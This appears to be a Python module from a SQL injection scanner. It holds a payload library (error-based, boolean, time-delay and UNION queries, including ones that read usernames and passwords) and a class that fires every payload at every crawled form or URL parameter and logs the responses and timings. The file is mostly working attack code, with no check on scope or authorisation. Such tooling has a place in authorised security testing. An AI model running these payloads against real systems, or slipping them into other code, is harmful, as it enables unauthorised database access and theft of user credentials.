import logging
import time
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs

import requests

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# SQL Injection payload library
# ---------------------------------------------------------------------------

PAYLOADS: dict[str, list[str]] = {
    "error_based": [
        "'",
        "''",
        "`",
        "\"",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x "
        "FROM information_schema.tables GROUP BY x)a)--",
        "1 AND EXP(~(SELECT * FROM (SELECT USER()) x))--",
    ],
    "boolean_based": [
        "' AND '1'='1",
        "' AND '1'='2",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND SUBSTRING(username,1,1)='a'--",
        "1' AND SUBSTRING(username,1,1)='z'--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",                    # MSSQL
        "' OR SLEEP(5)--",                               # MySQL
        "'; SELECT pg_sleep(5)--",                       # PostgreSQL
        "' AND SLEEP(5) AND '1'='1",
        "1; WAITFOR DELAY '0:0:5'--",
        "1 OR SLEEP(5)",
        "' OR pg_sleep(5)--",
        "') OR SLEEP(5)--",
    ],
    "union_based": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION SELECT @@version,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT username,password FROM users--",
    ],
}

# Flat list with attack-type metadata attached
ALL_PAYLOADS: list[dict] = [
    {"attack_type": attack_type, "payload": payload}
    for attack_type, payloads in PAYLOADS.items()
    for payload in payloads
]


class PayloadInjector:
    """
    Sends SQL injection payloads to every target returned by WebCrawler.

    Each result dict contains everything ResponseAnalyzer needs:
        url, method, parameter, payload, attack_type,
        response_text, response_time_ms, status_code, form_data
    """

    REQUEST_TIMEOUT = 12   # seconds — must exceed time-based payload delay (5 s)

    def __init__(self, targets: list[dict]):
        self.targets = targets
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (compatible; SQLiScanner/1.0; "
                "+https://github.com/your-repo/sqli-scanner)"
            )
        })

    # ------------------------------------------------------------------
    # Public entry point
    # ------------------------------------------------------------------

    def inject(self) -> list[dict]:
        """
        Run every payload against every target.
        Returns a flat list of result dicts.
        """
        results: list[dict] = []
        total = len(self.targets) * len(ALL_PAYLOADS)
        logger.info("Injector starting: %s target(s) × %s payload(s) = %s request(s).",
                    len(self.targets), len(ALL_PAYLOADS), total)

        for target in self.targets:
            for payload_info in ALL_PAYLOADS:
                result = self._send_request(target, payload_info)
                if result:
                    results.append(result)

        logger.info("Injector finished: %s result(s) collected.", len(results))
        return results

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _send_request(self, target: dict, payload_info: dict) -> dict | None:
        """Fire one payload at one target. Returns a result dict or None on error."""
        url        = target["url"]
        method     = target["method"].upper()
        parameter  = target["parameter"]
        form_data  = dict(target.get("form_data", {}))
        payload    = payload_info["payload"]
        attack_type = payload_info["attack_type"]

        # Inject payload into the target parameter only
        injected_data = {**form_data, parameter: payload}

        start = time.monotonic()
        try:
            if method == "POST":
                response = self.session.post(
                    url,
                    data=injected_data,
                    timeout=self.REQUEST_TIMEOUT,
                    allow_redirects=True,
                )
            else:
                response = self.session.get(
                    url,
                    params=injected_data,
                    timeout=self.REQUEST_TIMEOUT,
                    allow_redirects=True,
                )

            elapsed_ms = int((time.monotonic() - start) * 1000)

            return {
                "url": url,
                "method": method,
                "parameter": parameter,
                "payload": payload,
                "attack_type": attack_type,
                "form_data": injected_data,
                "response_text": response.text,
                "response_time_ms": elapsed_ms,
                "status_code": response.status_code,
            }

        except requests.Timeout:
            elapsed_ms = int((time.monotonic() - start) * 1000)
            logger.debug("Timeout for %s [%s=%s]", url, parameter, payload[:30])
            # Timeouts are meaningful for time-based detection — return them
            return {
                "url": url,
                "method": method,
                "parameter": parameter,
                "payload": payload,
                "attack_type": attack_type,
                "form_data": injected_data,
                "response_text": "",
                "response_time_ms": elapsed_ms,
                "status_code": 0,
                "timed_out": True,
            }

        except requests.RequestException as exc:
            logger.warning("Request error for %s: %s", url, exc)
            return None